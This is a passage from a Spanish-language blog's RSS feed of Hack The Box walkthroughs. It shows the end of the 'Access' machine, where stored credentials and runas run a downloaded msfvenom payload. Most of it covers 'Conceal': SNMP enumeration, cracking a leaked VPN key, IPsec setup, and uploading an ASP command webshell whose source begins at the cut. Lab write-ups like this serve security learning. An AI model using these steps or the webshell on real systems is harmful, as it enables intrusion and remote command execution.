&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ecurity&lt;span class=&#34;se&#34;&gt;\L&lt;/span&gt;inks&amp;gt;cmdkey /list

Currently stored credentials:

    Target: Domain:interactive&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ACCESS&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator
                                                       Type: Domain Password
    User: ACCESS&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator
    

C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ecurity&lt;span class=&#34;se&#34;&gt;\L&lt;/span&gt;inks&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizando &amp;lsquo;runas&amp;rsquo; para ejecutar comandos con el usuario Administrator y con la contraseña guardada en la maquina. Primero generamos nuestro payload con msfvenom y ponemos a la escucha nuestro exploit.&lt;/p&gt;
&lt;p&gt;RUNAS =&amp;gt; &lt;a href=&#34;https://ss64.com/nt/runas.html&#34;&gt;https://ss64.com/nt/runas.html&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;metasploit&#34;&gt;Metasploit&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/access/Screenshot_20190302_213222.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;msfvenom&#34;&gt;Msfvenom&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/access/Screenshot_20190302_213546.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Teniendo nuestro entorno local listo, procedemos a descargar nuestro payload a la maquina y ejecutarlo con &amp;lsquo;runas&amp;rsquo;.&lt;/p&gt;
&lt;h4 id=&#34;cmd&#34;&gt;CMD&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/access/Screenshot_20190302_213721.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;python-http-server&#34;&gt;Python HTTP Server&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/access/Screenshot_20190302_213738.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En nuestro entorno local obtenemos una sesion y con el privilegios de administracion.&lt;/p&gt;
&lt;h4 id=&#34;metasploit---sesion&#34;&gt;Metasploit - Sesion&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/access/Screenshot_20190302_213835.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/access/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/access/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>windows</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Conceal</title>
        <link>https://sckull.github.io/posts/conceal/</link>
        <pubDate>Sat, 02 Mar 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 02 Mar 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/conceal/</guid>
        <description>Conceal es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Conceal es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/conceal/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;br&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;masscan&#34;&gt;MASSCAN&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;masscan -p1-65535,U:1-65535 10.10.10.116 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-01-27 00:03:27 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 161/udp on 10.10.10.116&amp;lt;/pre&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;snmp-port&#34;&gt;SNMP PORT&lt;/h2&gt;
&lt;p&gt;Utilizando un modulo de metasploit para obtener informacion, el modulo es el siguiente auxiliary/scanner/snmp/snmp_enum.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/conceal/Screenshot%20from%202019-04-05%2001.45.55.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;[*] &lt;span class=&#34;nx&#34;&gt;System&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;information&lt;/span&gt;:&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Host&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;IP&lt;/span&gt;                       : &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;116&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Hostname&lt;/span&gt;                      : &lt;span class=&#34;nx&#34;&gt;Conceal&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Description&lt;/span&gt;                   : &lt;span class=&#34;nx&#34;&gt;Hardware&lt;/span&gt;: &lt;span class=&#34;nx&#34;&gt;Intel64&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Family&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Model&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;79&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Stepping&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AT&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;AT&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;COMPATIBLE&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Software&lt;/span&gt;: &lt;span class=&#34;nx&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Version&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Build&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;15063&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Multiprocessor&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Contact&lt;/span&gt;                       : &lt;span class=&#34;nx&#34;&gt;IKE&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;VPN&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;PSK&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;C&lt;span class=&#34;m&#34;&gt;8&lt;/span&gt;B&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;A&lt;span class=&#34;m&#34;&gt;372&lt;/span&gt;B&lt;span class=&#34;m&#34;&gt;1878851&lt;/span&gt;BE&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;C&lt;span class=&#34;m&#34;&gt;097031&lt;/span&gt;B&lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;E&lt;span class=&#34;m&#34;&gt;43&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Location&lt;/span&gt;                      : &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Uptime&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;snmp&lt;/span&gt;                   : &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;:&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;:&lt;span class=&#34;m&#34;&gt;11&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Uptime&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;                 : &lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;:&lt;span class=&#34;m&#34;&gt;09&lt;/span&gt;:&lt;span class=&#34;m&#34;&gt;45&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;96&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;System&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;date&lt;/span&gt;                   : &lt;span class=&#34;m&#34;&gt;2019-3-2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;04&lt;/span&gt;:&lt;span class=&#34;m&#34;&gt;26&lt;/span&gt;:&lt;span class=&#34;m&#34;&gt;04&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;ike-vpn-password-psk&#34;&gt;IKE VPN password PSK&lt;/h2&gt;
&lt;p&gt;Utilizamos el wordlist rockyou y hashcat para desencriptar la contraseña.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;9c8b1a372b1878851be2c097031b6e43 NTLM : Dudecake1!
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;setup-ipsec---ike-vpn&#34;&gt;SETUP IPSEC - IKE VPN&lt;/h2&gt;
&lt;p&gt;Utilizamos strongswan para poder conectarnos mediante una VPN IKE y su configuracion es la siguiente.&lt;/p&gt;
&lt;p&gt;Instalamos strongswan:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo apt install strongswan
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Configuramos los siguientes archivos.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;[/etc/ipsec.conf]&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span class=&#34;nx&#34;&gt;conn&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;conceal&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;authby&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;secret&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;auto&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;route&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;ike&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;des&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sha1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;modp1024&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;12&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;184&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;116&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;keyexchange&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ikev1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;transport&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;des&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sha1&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;rightprotoport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;tcp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;[/etc/ipsec.secrets]&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;12&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;184&lt;/span&gt; : &lt;span class=&#34;nx&#34;&gt;PSK&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Dudecake1!&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;116&lt;/span&gt; : &lt;span class=&#34;nx&#34;&gt;PSK&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Dudecake1!&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;status-ipsec&#34;&gt;STATUS IPSEC&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/conceal/Screenshot%20from%202019-04-05%2001.40.51.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;nmap---ipsec&#34;&gt;NMAP - IPSEC&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/conceal/Screenshot%20from%202019-04-05%2001.40.22.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;smb---ipsec&#34;&gt;SMB - IPSEC&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/conceal/Screenshot%20from%202019-04-05%2001.38.46.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;rpc---ipsec&#34;&gt;RPC - IPSEC&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/conceal/Screenshot%20from%202019-04-05%2001.39.36.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;ftp---ipsec&#34;&gt;FTP - IPSEC&lt;/h3&gt;
&lt;p&gt;Nos conectamos como usuario anonymous pero no encontramos nada dentro.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/conceal/Screenshot%20from%202019-04-05%2001.50.35.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;http---ipsec&#34;&gt;HTTP - IPSEC&lt;/h2&gt;
&lt;p&gt;Enumerando con gobuster encontramos solo una direccion.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/conceal/Screenshot%20from%202019-04-05%2001.47.40.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;upload&#34;&gt;/upload&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/conceal/Screenshot%20from%202019-04-05%2001.55.02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;webshell&#34;&gt;WEBSHELL&lt;/h2&gt;
&lt;p&gt;Para obtener una webshell utilizamos ftp para subir nuestra webshell y visitar /upload/cmd.asp para interactuar con este.&lt;/p&gt;
&lt;h4 id=&#34;webshell-1&#34;&gt;WEBSHELL&lt;/h4&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp&#34;&gt;https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;%
Set oScript = Server.CreateObject(&amp;#34;WSCRIPT.SHELL&amp;#34;)
Set oScriptNet = Server.CreateObject(&amp;#34;WSCRIPT.NETWORK&amp;#34;)
Set oFileSys = Server.CreateObject(&amp;#34;Scripting.FileSystemObject&amp;#34;)
Function getCommandOutput(theCommand)
